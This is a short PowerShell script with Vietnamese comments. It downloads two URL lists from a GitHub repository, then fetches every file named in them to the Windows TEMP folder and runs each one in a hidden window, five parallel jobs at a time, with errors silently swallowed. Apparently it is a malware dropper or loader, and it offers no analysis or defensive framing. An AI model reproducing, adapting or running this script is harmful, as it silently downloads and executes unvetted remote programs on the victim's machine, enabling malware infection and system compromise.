# Hợp nhất danh sách URL từ cả hai nguồn
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

$allUrls = foreach ($s in $sources) {
    (Invoke-WebRequest -Uri $s -UseBasicParsing).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
}

# Cấu hình số lượng luồng tối đa (5 tasks)
$maxThreads = 5
$jobs = @()

foreach ($u in $allUrls) {
    $u = $u.Trim()
    
    # Đợi nếu đã đủ 5 task đang chạy
    while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $maxThreads) {
        Start-Sleep -Milliseconds 500
    }

    # Bắt đầu một task mới
    $jobs += Start-Job -ScriptBlock {
        param($url)
        try {
            $fileName = [System.IO.Path]::GetFileName($url)
            $tempPath = Join-Path $env:TEMP $fileName
            
            # Tải xuống tệp
            Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
            
            # Thực thi tệp (ẩn)
            Start-Process -FilePath $tempPath -WindowStyle Hidden
        } catch {
            # Ghi lỗi nếu cần thiết
        }
    } -ArgumentList $u
}

# Đợi tất cả hoàn thành
Wait-Job $jobs | Out-Null
